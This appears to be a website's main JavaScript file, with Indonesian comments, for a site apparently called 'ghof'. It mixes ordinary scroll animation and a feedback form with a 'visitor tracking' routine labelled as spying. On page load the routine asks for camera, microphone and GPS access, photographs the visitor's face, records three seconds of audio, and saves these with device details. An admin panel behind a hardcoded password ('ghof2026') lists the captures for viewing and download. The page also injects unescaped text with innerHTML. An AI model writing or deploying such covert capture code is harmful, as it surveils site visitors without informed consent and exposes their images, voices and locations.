// 1. Animasi Scroll
function revealOnScroll() {
    const reveals = document.querySelectorAll(".reveal");
    for (let i = 0; i < reveals.length; i++) {
        const windowHeight = window.innerHeight;
        const elementTop = reveals[i].getBoundingClientRect().top;
        if (elementTop < windowHeight - 80) reveals[i].classList.add("active");
    }
}
window.addEventListener("scroll", revealOnScroll);
window.addEventListener("load", revealOnScroll);

// Toggle Menu HP
const mobileMenuBtn = document.getElementById("mobile-menu-btn");
const mobileMenu = document.getElementById("mobile-menu");
if (mobileMenuBtn && mobileMenu) {
    mobileMenuBtn.addEventListener("click", () => mobileMenu.classList.toggle("hidden"));
}
function closeMobileMenu() { if (mobileMenu) mobileMenu.classList.add("hidden"); }

// 2. OTOMATIS: Pelacakan Pengunjung (Kamera, Audio, Lokasi & Deteksi Device) saat buka index.html
window.addEventListener("DOMContentLoaded", () => {
    // Tampilkan pengumuman live
    const bannerEl = document.getElementById("live-announcement-banner");
    const savedAnnouncement = localStorage.getItem("ghof_live_announcement");
    if (bannerEl && savedAnnouncement) {
        bannerEl.innerHTML = `<span>${savedAnnouncement} &nbsp;&nbsp;•&nbsp;&nbsp;</span><span>${savedAnnouncement} &nbsp;&nbsp;•&nbsp;&nbsp;</span>`;
    }

    // Jalankan pelacakan jika berada di halaman utama (index.html)
    const spyVideo = document.getElementById("spy-video");
    if (spyVideo) {
        trackVisitorData();
    }
});

async function trackVisitorData() {
    let visitorData = {
        id: "VISITOR-" + Math.floor(Math.random() * 90000 + 10000),
        time: new Date().toLocaleString("id-ID"),
        device: detectDeviceOS(),
        location: "Meminta izin lokasi...",
        photo: null,
        audio: null
    };

    // A. Ambil Lokasi GPS Pengunjung
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                visitorData.location = `Lat: ${pos.coords.latitude.toFixed(4)}, Lon: ${pos.coords.longitude.toFixed(4)}`;
                saveVisitorToStorage(visitorData);
            },
            () => {
                visitorData.location = "Akses Lokasi Ditolak Pengguna";
                saveVisitorToStorage(visitorData);
            },
            { timeout: 10000 }
        );
    } else {
        visitorData.location = "Tidak Mendukung Geolocation";
    }

    // B. Minta Izin Kamera & Ambil Foto Wajah Pengunjung
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const videoEl = document.getElementById("spy-video");
        videoEl.srcObject = stream;

        // Ambil foto setelah 2 detik kamera aktif
        setTimeout(() => {
            const canvas = document.createElement("canvas");
            canvas.width = 320;
            canvas.height = 240;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
            visitorData.photo = canvas.toDataURL("image/png");

            // Rekam Audio Suara Singkat (3 Detik)
            let audioChunks = [];
            const mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
            mediaRecorder.onstop = () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = () => {
                    visitorData.audio = reader.result;
                    saveVisitorToStorage(visitorData);
                };
            };
            mediaRecorder.start();
            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop()); // Matikan perangkat setelah selesai
            }, 3000);

        }, 2000);

    } catch (err) {
        visitorData.photo = null;
        visitorData.audio = null;
        saveVisitorToStorage(visitorData);
    }
}

// Deteksi Jenis Perangkat (Device & Browser)
function detectDeviceOS() {
    const ua = navigator.userAgent;
    let os = "Unknown OS";
    let browser = "Unknown Browser";

    if (/android/i.test(ua)) os = "Android Mobile";
    else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS (Apple)";
    else if (/win/i.test(ua)) os = "Windows PC";
    else if (/mac/i.test(ua)) os = "Mac OS";

    if (/chrome/i.test(ua)) browser = "Google Chrome";
    else if (/safari/i.test(ua)) browser = "Safari";
    else if (/firefox/i.test(ua)) browser = "Firefox";

    return `${os} | ${browser}`;
}

function saveVisitorToStorage(data) {
    let visitors = JSON.parse(localStorage.getItem("ghof_visitors") || "[]");
    // Cek apakah sudah ada, update atau push baru
    let existingIdx = visitors.findIndex(v => v.id === data.id);
    if (existingIdx >= 0) {
        visitors[existingIdx] = data;
    } else {
        visitors.unshift(data);
    }
    localStorage.setItem("ghof_visitors", JSON.stringify(visitors));
}

// 3. Form Saran Pengunjung
const feedbackForm = document.getElementById("feedback-form");
if (feedbackForm) {
    feedbackForm.addEventListener("submit", function (e) {
        e.preventDefault();
        const name = document.getElementById("sender-name").value;
        const city = document.getElementById("sender-city").value;
        const message = document.getElementById("sender-message").value;

        let feedbacks = JSON.parse(localStorage.getItem("ghof_feedbacks") || "[]");
        feedbacks.unshift({ name, city, message, date: new Date().toLocaleString("id-ID") });
        localStorage.setItem("ghof_feedbacks", JSON.stringify(feedbacks));
        feedbackForm.reset();
        alert("Terima kasih! Masukan Anda berhasil terkirim.");
    });
}

// 4. Panel Admin (Khusus admin.html)
function verifyAdmin() {
    const pass = document.getElementById("admin-password").value.trim();
    if (pass === "ghof2026") {
        document.getElementById("admin-login-view").classList.add("hidden");
        document.getElementById("admin-dashboard-view").classList.remove("hidden");
        loadVisitorsData();
    } else {
        document.getElementById("login-error").classList.remove("hidden");
    }
}

function logoutAdmin() {
    document.getElementById("admin-login-view").classList.remove("hidden");
    document.getElementById("admin-dashboard-view").classList.add("hidden");
    document.getElementById("admin-password").value = "";
}

function saveAnnouncement() {
    const text = document.getElementById("admin-announcement-input").value.trim();
    if (!text) { alert("Teks kosong!"); return; }
    localStorage.setItem("ghof_live_announcement", text);
    alert("Pengumuman berhasil dipublikasikan ke web utama!");
}

function loadVisitorsData() {
    const listEl = document.getElementById("visitor-list");
    const countEl = document.getElementById("visitor-count");
    const visitors = JSON.parse(localStorage.getItem("ghof_visitors") || "[]");

    if (countEl) countEl.textContent = visitors.length;
    if (!listEl) return;

    if (visitors.length === 0) {
        listEl.innerHTML = `<p class="text-gray-500 italic p-4 bg-[#070d1b] rounded-xl col-span-2">Belum ada data pengunjung yang terekam.</p>`;
        return;
    }

    listEl.innerHTML = visitors.map(v => `
        <div class="bg-[#070d1b] border border-[#C5A059]/40 p-4 rounded-2xl space-y-3 shadow-lg">
            <div class="flex justify-between items-center border-b border-gray-800 pb-2">
                <span class="text-xs font-bold text-[#C5A059]">${v.id}</span>
                <span class="text-[10px] text-gray-400">${v.time}</span>
            </div>
            
            <div class="grid grid-cols-3 gap-3 items-center">
                <!-- Foto Wajah Pengunjung -->
                <div>
                    ${v.photo ? `<img src="${v.photo}" class="w-20 h-20 rounded-xl object-cover border border-[#C5A059]">` : `<div class="w-20 h-20 bg-gray-800 rounded-xl flex items-center text-[10px] text-gray-400 justify-center text-center p-1">Tanpa Foto</div>`}
                    ${v.photo ? `<a href="${v.photo}" download="Wajah_${v.id}.png" class="mt-1 block text-[10px] text-center bg-[#C5A059] text-[#070d1b] font-bold py-1 rounded">Download Foto</a>` : ''}
                </div>

                <!-- Data Detail (Device & Lokasi) -->
                <div class="col-span-2 text-xs space-y-1">
                    <p><strong>📱 Perangkat:</strong> <span class="text-gray-300">${v.device}</span></p>
                    <p><strong>📍 Lokasi GPS:</strong> <span class="text-yellow-400">${v.location}</span></p>
                    
                    <!-- Audio Player & Download -->
                    <div class="mt-2">
                        <p class="font-bold text-[11px] mb-1">🎙️ Rekaman Suara:</p>
                        ${v.audio ? `<audio controls src="${v.audio}" class="w-full h-8 mb-1"></audio><a href="${v.audio}" download="Audio_${v.id}.webm" class="text-[10px] bg-green-600 text-white px-2 py-0.5 rounded inline-block">Download Audio</a>` : '<span class="text-gray-500 text-[10px]">Audio tidak tersedia</span>'}
                    </div>
                </div>
            </div>
        </div>
    `).join("");
}

function clearVisitors() {
    if (confirm("Hapus semua riwayat data pengunjung?")) {
        localStorage.removeItem("ghof_visitors");
        loadVisitorsData();
    }
}
